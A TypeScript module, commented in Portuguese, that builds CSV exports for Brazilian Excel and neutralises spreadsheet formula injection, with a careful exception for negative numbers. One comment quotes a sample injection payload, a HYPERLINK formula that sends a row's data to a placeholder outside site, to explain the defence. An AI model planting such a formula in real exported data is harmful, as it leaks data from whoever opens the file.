/**
 * EXPORTAÇÃO CSV (TR 7.48) — o CSV É A TELA, não uma segunda consulta.
 *
 * ⚠️ AS ESCOLHAS SÃO PARA O EXCEL BR, e cada uma tem motivo:
 *   · separador `;` — porque o Excel em pt-BR usa a VÍRGULA como decimal, então a vírgula NÃO pode
 *     separar colunas (senão "1.234,56" viraria duas células). O `;` é o separador do Excel BR.
 *   · UTF-8 com BOM — sem o BOM, o Excel abre UTF-8 como Latin-1 e "Ó" vira "Ã³". O BOM (﻿) diz
 *     "isto é UTF-8", e aí acento abre certo.
 *   · CRLF nas linhas — a convenção que o Excel espera.
 *   · valores JÁ FORMATADOS como na tela ("1.234,56") — o CSV repete o que o leitor vê, byte a byte.
 *
 * As células que contêm `;`, aspas ou quebra de linha vão entre aspas, com as aspas internas
 * duplicadas (o padrão RFC 4180) — senão um histórico com `;` partiria a linha.
 */

const BOM = "﻿";

/**
 * ═══ ⚠️ A NEUTRALIZAÇÃO DE FÓRMULA (V9 N2) — O CSV É ABERTO NUMA PLANILHA ═══
 *
 * Excel e LibreOffice tratam como FÓRMULA toda célula que começa com `=`, `+`, `@`, `-`, tabulação
 * ou retorno de carro. Numa exportação pública isso é execução de conteúdo de terceiro na máquina
 * de quem baixa: uma descrição de bem gravada como
 * `=HYPERLINK("http://algum-site/?d="&A1,"clique")` vira um link que leva a linha inteira embora
 * quando alguém abre o arquivo — e o dado veio do cadastro, onde qualquer operador digita.
 *
 * ⚠️ E O `-` TEM UMA EXCEÇÃO, senão a correção quebra o arquivo. `-1.234,56` é um valor negativo
 * legítimo e precisa continuar sendo NÚMERO na planilha; prefixá-lo o transformaria em texto, e
 * uma coluna de valores que não soma é um defeito tão real quanto o outro. Por isso a regra olha
 * o conteúdo: começa com caractere perigoso **e não é um número puro** → neutraliza.
 *
 * A neutralização é o apóstrofo à frente, dentro de aspas. É o que a planilha entende como "isto é
 * texto"; o apóstrofo não aparece na célula exibida.
 */
const NUMERO_PURO = /^-?[\d.]+(,\d+)?$/;

export function neutralizarFormula(valor: string): string {
  if (!/^[=+@\t\r]/.test(valor) && !(valor.startsWith("-") && !NUMERO_PURO.test(valor))) return valor;
  return `'${valor}`;
}

function celula(valor: string): string {
  const seguro = neutralizarFormula(valor);
  // ⚠️ As aspas entram quando o valor tem separador/aspas/quebra OU quando ELE FOI neutralizado
  // (`seguro !== valor`). O apóstrofo só precisa das aspas quando é o que nós pusemos à frente —
  // testar `'` em qualquer posição poria aspas em todo nome com apóstrofo, sem motivo.
  if (/[;"\r\n]/.test(seguro) || seguro !== valor) {
    return `"${seguro.replace(/"/g, '""')}"`;
  }
  return seguro;
}

/**
 * Monta o CSV a partir dos rótulos das colunas e das linhas (valores já formatados como na tela).
 * O número de valores por linha deve casar com o número de colunas — o chamador garante (é a tela).
 */
export function paraCsv(colunas: readonly string[], linhas: readonly (readonly string[])[]): string {
  const cabecalho = colunas.map(celula).join(";");
  const corpo = linhas.map((l) => l.map(celula).join(";")).join("\r\n");
  const conteudo = linhas.length > 0 ? `${cabecalho}\r\n${corpo}` : cabecalho;
  return `${BOM}${conteudo}\r\n`;
}

/**
 * V37 — VÁRIAS TABELAS NUM CSV SÓ, para os demonstrativos (RREO, RGF) que têm mais de um quadro na tela: cada quadro
 * começa pelo título numa linha própria e termina numa linha em branco. As células passam pela mesma neutralização
 * de fórmula e pelas mesmas aspas do `paraCsv`. Quem monta as linhas é a tela (o CSV é a tela).
 */
export function tabelasParaCsv(tabelas: readonly { readonly titulo: string; readonly linhas: readonly (readonly string[])[] }[]): string {
  const blocos = tabelas
    .filter((t) => t.linhas.length > 0)
    .map((t) => [...(t.titulo !== "" ? [celula(t.titulo)] : []), ...t.linhas.map((l) => l.map(celula).join(";"))].join("\r\n"));
  return `${BOM}${blocos.join("\r\n\r\n")}\r\n`;
}
